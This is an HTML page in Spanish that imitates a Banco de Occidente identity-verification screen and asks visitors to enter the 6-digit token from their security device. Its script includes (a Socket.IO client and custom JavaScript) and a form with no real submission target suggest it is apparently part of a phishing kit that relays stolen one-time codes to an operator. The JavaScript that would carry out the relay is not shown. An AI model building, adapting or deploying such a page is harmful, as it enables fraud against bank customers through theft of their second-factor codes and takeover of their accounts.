<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Occidente - Verificación Token</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <!-- Seguridad Badge -->
        <div class="security-badge">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L4 6V11C4 16.55 7.84 21.74 13 23C18.16 21.74 22 16.55 22 11V6L12 2ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="#00C853"/>
            </svg>
            <span>Seguridad</span>
        </div>

        <!-- Main Card -->
        <div class="card">
            <!-- Logo -->
            <div class="logo-container">
                <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
            </div>

            <!-- Title -->
            <div class="welcome-text">
                <p class="welcome">Verificación de identidad</p>
                <p class="portal-title">Ingresa tu Token</p>
            </div>

            <!-- Info Message -->
            <div class="info-box">
                <p>Por tu seguridad, ingresa el <strong>token de 6 dígitos</strong> generado por tu dispositivo de seguridad.</p>
            </div>

            <!-- Form -->
            <form class="login-form" id="form-token">
                <!-- Token Field -->
                <div class="form-group">
                    <label for="token">Token de seguridad</label>
                    <input 
                        type="text" 
                        id="token" 
                        placeholder="Ingresa los 6 dígitos" 
                        class="input-field input-token" 
                        maxlength="6"
                        pattern="[0-9]{6}"
                        required
                        autocomplete="off"
                        inputmode="numeric"
                    >
                    <div class="token-indicators">
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                        <span class="digit-indicator"></span>
                    </div>
                </div>

                <!-- Help Text -->
                <div class="help-text">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#666"/>
                    </svg>
                    <span>Ingresa el token de 6 dígitos generado por tu dispositivo de seguridad</span>
                </div>

                <!-- Submit Button -->
                <button type="button" class="btn-login" id="btnContinuar" disabled>
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="white"/>
                    </svg>
                    Verificar Token
                </button>

                <!-- Back Link -->
                <div class="back-link">
                    <a href="/index.html">← Volver al inicio</a>
                </div>
            </form>
        </div>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
            <p class="loading-text">Verificando token...</p>
        </div>
    </div>

    <!-- Socket.IO Client -->
    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="token-optimized.js"></script>
</body>
</html>
